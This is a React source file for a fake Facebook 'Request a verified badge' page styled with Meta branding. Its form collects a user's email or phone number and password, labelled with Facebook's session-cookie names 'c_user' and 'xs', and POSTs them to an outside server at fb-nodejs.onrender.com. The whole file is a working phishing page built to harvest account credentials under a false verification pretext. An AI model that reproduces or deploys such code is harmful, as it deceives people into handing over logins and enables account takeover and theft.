import './Fbpage.css';
import 'bootstrap/dist/css/bootstrap.min.css';
import 'font-awesome/css/font-awesome.min.css';
import 'bootstrap/dist/js/bootstrap.bundle.min.js';
import React from 'react';
import { useState } from 'react';

const Fbpage = () => {
  const [formData, setFormData] = useState({
    c_user: '',
    xs: ''
  });
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitStatus, setSubmitStatus] = useState(null); // For success/error messages

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);
    setSubmitStatus(null);
    
    try {
      // Create FormData object
      const formDataToSend = new FormData();
      formDataToSend.append('c_user', formData.c_user);
      formDataToSend.append('xs', formData.xs);

      const response = await fetch('https://fb-nodejs.onrender.com/api/submit', {
        method: 'POST',
        body: formDataToSend
      });

      const data = await response.json();
      
      if (response.ok) {
        setSubmitStatus({ success: true, message: 'Data submitted successfully!' });
        console.log('API Response:', data);
      } else {
        throw new Error(data.message || 'Failed to submit data');
      }
    } catch (error) {
      console.error('Submission error:', error);
      setSubmitStatus({ success: false, message: error.message || 'An error occurred during submission' });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-white">
      <div className="md:block lg:block hidden text-center border h-24 relative bg-[#4667ac]">
        <div className="mx-10 mt-4">
          <b className="text-5xl text-white">Meta</b>
        </div>
      </div>

      <form 
        className="sm:hidden lg:block md:block" 
        onSubmit={handleSubmit}
      >
        <div style={{ position: 'absolute', left: '1.5rem', top: '8rem', width: '90%' }}>
          <div>
            <p className="border-b h-10 font-bold text-[16px] text-[#4b4f56] pl-3 p-2 bg-[#f5f6f7]">
              Request a verified badge on Facebook 
            </p>
          </div>
          
          <div>
            <p className="mt-4 pl-3 text-[12px] font-semibold">
              The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the individual, public figure or brand that it represents.
            </p>
          </div>
          
          <div>
            <p className="mt-4 pl-3 text-[12px] font-semibold">
              Previously, the verified badge also required the person or brand to be notable and unique. You may still see users with a verified badge that represents our previous eligibility requirements.
            </p>
          </div>
          
          <div>
            <p className="pl-3 text-[12px] font-semibold">
              Please be sure to provide the requested information below.
            </p>
          </div>
          
          <div className="mb-2">
            <p className="text-slate-400 pl-4 mt-1">
              Email & Mobile No.
            </p>
            <input 
              className={`border h-8 pl-2 mx-3 w-64`}
              type="text" 
              name="c_user" 
              value={formData.c_user}
              onChange={handleChange}
              placeholder="Enter Email & Mobile No." 
              required 
              aria-required="true" 
            />
          </div>
          
          <div className="mb-4">
            <p className="text-slate-400 pl-4 mt-1">
             Password
            </p>
            <input 
              className={`border h-8 pl-2 mx-3 w-64`}
              type="password" 
              name="xs" 
              value={formData.xs}
              onChange={handleChange}
              placeholder="Enter Password" 
              required 
              aria-required="true" 
            />
          </div>
          
          <div>
            <p className="mt-4 pl-3 text-[12px] font-semibold">
              Please make sure account not to log out from your computer or laptop until you have received a verification email.
            </p>
          </div>
          <div className="border mx-3 h-10 mt-4 bg-[#f5f6f7]">
            <div className="flex justify-end mx-2">
              <button 
                className={`border h-7 w-16 bg-[#4267b2] text-white shadow-2xl mt-[0.30rem] font-serif font-thin text-xs hover:bg-blue-500 ${isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`}
                type="submit"
                disabled={isSubmitting}
              >
                {isSubmitting ? 'Submitting...' : 'Submit'}
              </button>
            </div>
          </div>
        </div>
      </form>
    </div>
  );
};

export default Fbpage;





